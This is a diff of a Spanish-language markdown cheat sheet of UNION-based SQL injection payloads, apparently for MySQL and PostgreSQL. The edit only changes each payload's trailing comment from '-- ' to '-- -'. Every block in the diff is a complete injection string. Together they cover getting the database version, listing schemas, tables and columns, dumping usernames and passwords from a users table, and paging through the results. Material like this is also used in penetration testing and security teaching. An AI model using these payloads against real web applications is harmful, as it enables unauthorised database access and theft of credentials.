@@ -10,32 +10,32 @@ En este documento recogemos las principales consultas de enumeración y extracci
 
 ## Obtener versión
 ```sql
-' UNION SELECT NULL, @@version -- 
+' UNION SELECT NULL, @@version-- -
 ```
 
 ## Listar bases de datos
 ```sql
-' UNION SELECT NULL, schema_name FROM information_schema.schemata -- 
+' UNION SELECT NULL, schema_name FROM information_schema.schemata-- - 
 ```
 
 ## Listar tablas
 ```sql
-' UNION SELECT NULL, table_name FROM information_schema.tables WHERE table_schema = 'nombre_base_datos' -- 
+' UNION SELECT NULL, table_name FROM information_schema.tables WHERE table_schema = 'nombre_base_datos'-- - 
 ```
 
 ## Listar columnas
 ```sql
-' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name = 'nombre_tabla' AND table_schema = 'nombre_base_datos' -- 
+' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name = 'nombre_tabla' AND table_schema = 'nombre_base_datos'-- -
 ```
 
 ## Extraer datos
 ```sql
-' UNION SELECT username, password FROM users -- 
+' UNION SELECT username, password FROM users-- -
 ```
 
 ## Paginación
 ```sql
-' UNION SELECT NULL, col FROM tabla LIMIT 10 OFFSET 0 -- 
+' UNION SELECT NULL, col FROM tabla LIMIT 10 OFFSET 0-- -
 ```
 
 ---
@@ -44,7 +44,7 @@ En este documento recogemos las principales consultas de enumeración y extracci
 
 ## Obtener versión
 ```sql
-' UNION SELECT NULL, version() -- 
+' UNION SELECT NULL, version()-- 
 ```
 
 ## Listar bases de datos
